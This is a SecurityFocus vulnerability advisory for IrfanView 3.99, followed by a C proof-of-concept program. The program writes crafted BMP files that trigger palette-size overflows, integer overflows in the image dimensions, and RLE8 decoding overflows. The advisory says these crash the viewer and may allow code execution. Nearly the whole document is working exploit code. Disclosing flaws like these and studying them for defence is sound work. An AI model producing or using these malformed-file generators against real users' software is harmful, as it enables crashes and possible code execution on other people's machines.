source: http://www.securityfocus.com/bid/23318/info

IrfanView is prone to multiple denial-of-service vulnerabilities because the application fails to properly handle malformed BMP image files.

Successfully exploiting these issues allows attackers to crash the affected application. Due to the nature of the issues, code execution may also be possible, but this has not been confirmed.

IrfanView 3.99 is affected; other versions may also be vulnerable. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


struct BITMAPFILEHEADER {
unsigned int bfSize;
unsigned int bfReserved;
unsigned int bfOffBits;
};

struct BITMAPINFOHEADER {
unsigned int biSize;
unsigned int biWidth;
unsigned int biHeight;
unsigned short biPlanes;
unsigned short biBitCount;
unsigned int biCompression;
unsigned int biSizeImage;
unsigned int biXPelsPerMeter;
unsigned int biYPelsPerMeter;
unsigned int biClrUsed;
unsigned int biClrImportant;
};

void writebmp(char *filename, unsigned long width, unsigned long height, unsigned int bpp, unsigned int compression, unsigned char *palette, long numpalettecolors, unsigned char *data, long numdatabytes) {
BITMAPFILEHEADER fileheader;
BITMAPINFOHEADER infoheader;

memset(&fileheader,0,sizeof(BITMAPFILEHEADER));
memset(&infoheader,0,sizeof(BITMAPINFOHEADER));

unsigned char sig[2];
sig[0] = 'B';
sig[1] = 'M';

fileheader.bfSize = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4+numdatabytes;
fileheader.bfOffBits = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4;

infoheader.biSize = 40;
infoheader.biWidth = width;
infoheader.biHeight = height;
infoheader.biPlanes = 1;
infoheader.biBitCount = bpp;
infoheader.biCompression = compression;
infoheader.biClrUsed = numpalettecolors;

FILE *fp = fopen(filename,"wb");
fwrite(&sig,sizeof(sig),1,fp);
fwrite(&fileheader,sizeof(BITMAPFILEHEADER),1,fp);
fwrite(&infoheader,sizeof(BITMAPINFOHEADER),1,fp);
if(palette) fwrite(palette,numpalettecolors*4,1,fp);
fwrite(data,numdatabytes,1,fp);
fclose(fp);
}

int main() {
unsigned char * buf;
buf = (unsigned char *)malloc(4000000);
memset(buf,0,4000000);
unsigned char * buf2;
buf2 = (unsigned char *)malloc(4000000);
memset(buf2,0,4000000);

//overflows specifying too large palette
writebmp("ok8bit.bmp",16,16,8,0,buf,256,buf,16*16);
writebmp("paletteof1.bmp",16,16,8,0,buf,65535,buf,16*16);
writebmp("paletteof2.bmp",16,16,8,0,buf,1000000,buf,16*16);

//integer overflows with image dimensions
writebmp("ok24bit.bmp",16,16,24,0,NULL,0,buf,16*16*4);
writebmp("wh4intof.bmp",32769,32768,24,0,NULL,0,buf,4000000);
writebmp("wh3intof.bmp",37838,37838,24,0,NULL,0,buf,4000000);
writebmp("w4intof.bmp",1073741825,1,24,0,NULL,0,buf,4000000);
writebmp("w3intof.bmp",1431655767,1,24,0,NULL,0,buf,4000000);

//overflows with RLE encoded BMPs
buf2[0]=16;
buf2[1]=0;
writebmp("okRLE.bmp",16,1,8,1,buf,256,buf2,2);
for(long i=0;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of1.bmp",16,1,8,1,buf,256,buf2,1000000);
buf2[0]=15;
buf2[1]=0;
for(long i=1;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of2.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
buf2[0]=0;
buf2[1]=2;
buf2[2]=255;
buf2[3]=0;
for(long i=4;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of3.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
for(long i=0;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of4.bmp",16,1,8,1,buf,256,buf2,1000000);
} 